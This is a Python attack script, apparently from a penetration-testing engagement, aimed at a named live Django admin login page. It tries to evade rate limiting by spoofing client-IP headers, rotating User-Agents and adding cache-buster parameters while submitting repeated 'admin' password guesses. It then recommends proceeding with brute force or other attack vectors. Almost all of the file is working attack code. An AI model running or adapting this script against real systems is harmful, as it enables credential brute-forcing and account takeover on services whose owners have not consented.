#!/usr/bin/env python3
"""
RATE LIMITING BYPASS TESTS - Django Admin
Target: https://bkd.redahub.cloud/admin/login/
Author: Neural-OffSec-Team
Date: 2025-11-15
Engagement: REDAHUB-web-wildcard
CVSS: 7.5 HIGH (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
---
Document Timestamp: 15-11-2025 17:54 BRT
---
"""

import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RateLimitBypassTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.results = {
            'x_forwarded_for': [],
            'user_agent_rotation': [],
            'cache_buster': [],
            'header_combination': []
        }

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "curl/7.64.1",
            "Python-Requests/2.25.1",
            "Custom-Bot/1.0",
            "Googlebot/2.1",
            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/91.0",
            "PostmanRuntime/7.28.4",
            "Apache-HttpClient/4.5.13",
            "Go-http-client/1.1",
            "Java/11.0.11"
        ]

    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    def random_string(self, length: int = 10) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def test_x_forwarded_for(self, count: int = 15) -> Dict:
        """Test 1: IP Header Spoofing (X-Forwarded-For)"""
        self.log("üî• TESTE 1: X-Forwarded-For Bypass", "TEST")

        results = {
            'success': 0,
            'blocked': 0,
            'errors': 0,
            'response_times': [],
            'status_codes': []
        }

        for i in range(1, count + 1):
            try:
                fake_ip = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"

                headers = {
                    'X-Forwarded-For': fake_ip,
                    'X-Real-IP': fake_ip,
                    'X-Originating-IP': fake_ip,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0'
                }

                data = {
                    'username': 'admin',
                    'password': f'test{i}',
                    'csrfmiddlewaretoken': 'test'
                }

                start_time = time.time()
                response = requests.post(
                    self.target_url,
                    headers=headers,
                    data=data,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                response_time = time.time() - start_time

                results['response_times'].append(response_time)
                results['status_codes'].append(response.status_code)

                if response.status_code == 200:
                    results['success'] += 1
                    self.log(f"‚úÖ Request {i} ({fake_ip}): HTTP {response.status_code} - {response_time:.2f}s", "SUCCESS")
                elif response.status_code == 429:
                    results['blocked'] += 1
                    self.log(f"üö´ Request {i} ({fake_ip}): HTTP {response.status_code} - RATE LIMITED", "BLOCKED")
                else:
                    results['success'] += 1
                    self.log(f"‚ö†Ô∏è  Request {i} ({fake_ip}): HTTP {response.status_code}", "INFO")

                time.sleep(0.5)  # Small delay between requests

            except Exception as e:
                results['errors'] += 1
                self.log(f"‚ùå Request {i}: {str(e)}", "ERROR")

        bypass_rate = (results['success'] / count) * 100
        self.log(f"\nüìä X-Forwarded-For Results: {results['success']}/{count} success ({bypass_rate:.1f}%)", "RESULT")

        return results

    def test_user_agent_rotation(self, count: int = 15) -> Dict:
        """Test 2: User-Agent Rotation"""
        self.log("\nüî• TESTE 2: User-Agent Rotation", "TEST")

        results = {
            'success': 0,
            'blocked': 0,
            'errors': 0,
            'response_times': [],
            'status_codes': []
        }

        for i in range(1, count + 1):
            try:
                user_agent = random.choice(self.user_agents)

                headers = {
                    'User-Agent': user_agent,
                    'Content-Type': 'application/x-www-form-urlencoded'
                }

                data = {
                    'username': 'admin',
                    'password': f'test{i}',
                    'csrfmiddlewaretoken': 'test'
                }

                start_time = time.time()
                response = requests.post(
                    self.target_url,
                    headers=headers,
                    data=data,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                response_time = time.time() - start_time

                results['response_times'].append(response_time)
                results['status_codes'].append(response.status_code)

                if response.status_code == 200:
                    results['success'] += 1
                    self.log(f"‚úÖ Request {i} ({user_agent[:30]}...): HTTP {response.status_code}", "SUCCESS")
                elif response.status_code == 429:
                    results['blocked'] += 1
                    self.log(f"üö´ Request {i}: HTTP {response.status_code} - RATE LIMITED", "BLOCKED")
                else:
                    results['success'] += 1
                    self.log(f"‚ö†Ô∏è  Request {i}: HTTP {response.status_code}", "INFO")

                time.sleep(0.5)

            except Exception as e:
                results['errors'] += 1
                self.log(f"‚ùå Request {i}: {str(e)}", "ERROR")

        bypass_rate = (results['success'] / count) * 100
        self.log(f"\nüìä User-Agent Rotation Results: {results['success']}/{count} success ({bypass_rate:.1f}%)", "RESULT")

        return results

    def test_cache_buster(self, count: int = 15) -> Dict:
        """Test 3: Cache Buster Parameters"""
        self.log("\nüî• TESTE 3: Cache Buster Parameters", "TEST")

        results = {
            'success': 0,
            'blocked': 0,
            'errors': 0,
            'response_times': [],
            'status_codes': []
        }

        for i in range(1, count + 1):
            try:
                # Multiple cache buster params
                cache_params = {
                    'cache': random.randint(10000, 99999),
                    'v': random.randint(1, 9999),
                    'nocache': self.random_string(),
                    '_': int(time.time() * 1000)
                }

                params_str = '&'.join([f"{k}={v}" for k, v in cache_params.items()])
                url_with_cache = f"{self.target_url}?{params_str}"

                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }

                data = {
                    'username': 'admin',
                    'password': f'test{i}',
                    'csrfmiddlewaretoken': 'test'
                }

                start_time = time.time()
                response = requests.post(
                    url_with_cache,
                    headers=headers,
                    data=data,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                response_time = time.time() - start_time

                results['response_times'].append(response_time)
                results['status_codes'].append(response.status_code)

                if response.status_code == 200:
                    results['success'] += 1
                    self.log(f"‚úÖ Request {i}: HTTP {response.status_code} - Cache bypass", "SUCCESS")
                elif response.status_code == 429:
                    results['blocked'] += 1
                    self.log(f"üö´ Request {i}: HTTP {response.status_code} - RATE LIMITED", "BLOCKED")
                else:
                    results['success'] += 1
                    self.log(f"‚ö†Ô∏è  Request {i}: HTTP {response.status_code}", "INFO")

                time.sleep(0.5)

            except Exception as e:
                results['errors'] += 1
                self.log(f"‚ùå Request {i}: {str(e)}", "ERROR")

        bypass_rate = (results['success'] / count) * 100
        self.log(f"\nüìä Cache Buster Results: {results['success']}/{count} success ({bypass_rate:.1f}%)", "RESULT")

        return results

    def test_header_combination(self, count: int = 15) -> Dict:
        """Test 4: Combined Header Spoofing"""
        self.log("\nüî• TESTE 4: Combined Header Spoofing", "TEST")

        results = {
            'success': 0,
            'blocked': 0,
            'errors': 0,
            'response_times': [],
            'status_codes': []
        }

        for i in range(1, count + 1):
            try:
                fake_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                user_agent = random.choice(self.user_agents)

                headers = {
                    'X-Forwarded-For': fake_ip,
                    'X-Real-IP': fake_ip,
                    'X-Originating-IP': fake_ip,
                    'X-Remote-IP': fake_ip,
                    'X-Client-IP': fake_ip,
                    'CF-Connecting-IP': fake_ip,  # Cloudflare
                    'True-Client-IP': fake_ip,    # Akamai
                    'User-Agent': user_agent,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': f'https://google.com/search?q={self.random_string()}',
                    'Accept-Language': random.choice(['en-US', 'pt-BR', 'es-ES', 'fr-FR'])
                }

                data = {
                    'username': 'admin',
                    'password': f'test{i}',
                    'csrfmiddlewaretoken': 'test'
                }

                start_time = time.time()
                response = requests.post(
                    self.target_url,
                    headers=headers,
                    data=data,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                response_time = time.time() - start_time

                results['response_times'].append(response_time)
                results['status_codes'].append(response.status_code)

                if response.status_code == 200:
                    results['success'] += 1
                    self.log(f"‚úÖ Request {i} ({fake_ip}): HTTP {response.status_code}", "SUCCESS")
                elif response.status_code == 429:
                    results['blocked'] += 1
                    self.log(f"üö´ Request {i}: HTTP {response.status_code} - RATE LIMITED", "BLOCKED")
                else:
                    results['success'] += 1
                    self.log(f"‚ö†Ô∏è  Request {i}: HTTP {response.status_code}", "INFO")

                time.sleep(0.5)

            except Exception as e:
                results['errors'] += 1
                self.log(f"‚ùå Request {i}: {str(e)}", "ERROR")

        bypass_rate = (results['success'] / count) * 100
        self.log(f"\nüìä Combined Headers Results: {results['success']}/{count} success ({bypass_rate:.1f}%)", "RESULT")

        return results

    def run_parallel_tests(self):
        """Execute all tests in parallel"""
        self.log("\n" + "="*80, "INFO")
        self.log("üéØ RATE LIMITING BYPASS - PARALLEL EXECUTION", "INFO")
        self.log(f"Target: {self.target_url}", "INFO")
        self.log("="*80 + "\n", "INFO")

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = {
                executor.submit(self.test_x_forwarded_for, 15): 'X-Forwarded-For',
                executor.submit(self.test_user_agent_rotation, 15): 'User-Agent',
                executor.submit(self.test_cache_buster, 15): 'Cache-Buster',
                executor.submit(self.test_header_combination, 15): 'Combined-Headers'
            }

            all_results = {}
            for future in as_completed(futures):
                test_name = futures[future]
                try:
                    result = future.result()
                    all_results[test_name] = result
                except Exception as e:
                    self.log(f"‚ùå {test_name} failed: {str(e)}", "ERROR")

        total_time = time.time() - start_time

        # Generate final report
        self.generate_report(all_results, total_time)

    def run_sequential_tests(self):
        """Execute tests sequentially (more reliable for timing analysis)"""
        self.log("\n" + "="*80, "INFO")
        self.log("üéØ RATE LIMITING BYPASS - SEQUENTIAL EXECUTION", "INFO")
        self.log(f"Target: {self.target_url}", "INFO")
        self.log("="*80 + "\n", "INFO")

        start_time = time.time()

        all_results = {
            'X-Forwarded-For': self.test_x_forwarded_for(15),
            'User-Agent': self.test_user_agent_rotation(15),
            'Cache-Buster': self.test_cache_buster(15),
            'Combined-Headers': self.test_header_combination(15)
        }

        total_time = time.time() - start_time

        # Generate final report
        self.generate_report(all_results, total_time)

    def generate_report(self, all_results: Dict, total_time: float):
        """Generate comprehensive report"""
        self.log("\n" + "="*80, "INFO")
        self.log("üìã FINAL REPORT - RATE LIMITING BYPASS", "INFO")
        self.log("="*80 + "\n", "INFO")

        for test_name, results in all_results.items():
            total = len(results.get('status_codes', [0]))
            if total == 0:
                total = 15  # fallback

            success_count = results.get('success', 0)
            blocked_count = results.get('blocked', 0)
            error_count = results.get('errors', 0)

            bypass_rate = (success_count / total) * 100

            self.log(f"üîç {test_name}:", "INFO")
            self.log(f"   Success: {success_count}/{total} ({bypass_rate:.1f}%)", "INFO")
            self.log(f"   Blocked: {blocked_count}/{total}", "INFO")
            self.log(f"   Errors:  {error_count}/{total}", "INFO")

            if results.get('response_times'):
                avg_time = sum(results['response_times']) / len(results['response_times'])
                self.log(f"   Avg Response Time: {avg_time:.2f}s", "INFO")

            # Determine if bypass works
            if bypass_rate >= 80:
                self.log(f"   ‚úÖ BYPASS WORKS - {bypass_rate:.1f}% success rate!", "SUCCESS")
            elif bypass_rate >= 50:
                self.log(f"   ‚ö†Ô∏è  PARTIAL BYPASS - {bypass_rate:.1f}% success rate", "WARNING")
            else:
                self.log(f"   ‚ùå BYPASS FAILED - {bypass_rate:.1f}% success rate", "FAIL")

            self.log("", "INFO")

        self.log(f"‚è±Ô∏è  Total Execution Time: {total_time:.2f} seconds", "INFO")
        self.log("="*80 + "\n", "INFO")

        # Recommendations
        self.log("üí° RECOMMENDATIONS:", "INFO")

        best_method = None
        best_rate = 0

        for test_name, results in all_results.items():
            total = len(results.get('status_codes', [0])) or 15
            success_count = results.get('success', 0)
            bypass_rate = (success_count / total) * 100

            if bypass_rate > best_rate:
                best_rate = bypass_rate
                best_method = test_name

        if best_rate >= 80:
            self.log(f"‚úÖ USE {best_method} for bruteforce ({best_rate:.1f}% bypass rate)", "SUCCESS")
            self.log("‚úÖ Rate limiting can be bypassed - proceed with targeted bruteforce", "SUCCESS")
        elif best_rate >= 50:
            self.log(f"‚ö†Ô∏è  {best_method} shows promise ({best_rate:.1f}% bypass rate)", "WARNING")
            self.log("‚ö†Ô∏è  Consider slow bruteforce with this method", "WARNING")
        else:
            self.log("‚ùå No effective bypass found - rate limiting is effective", "FAIL")
            self.log("‚ùå Consider alternative attack vectors (user enum, password reset, etc)", "FAIL")

if __name__ == "__main__":
    target = "https://bkd.redahub.cloud/admin/login/"

    tester = RateLimitBypassTester(target)

    # Execute tests sequentially (more reliable for rate limit testing)
    tester.run_sequential_tests()
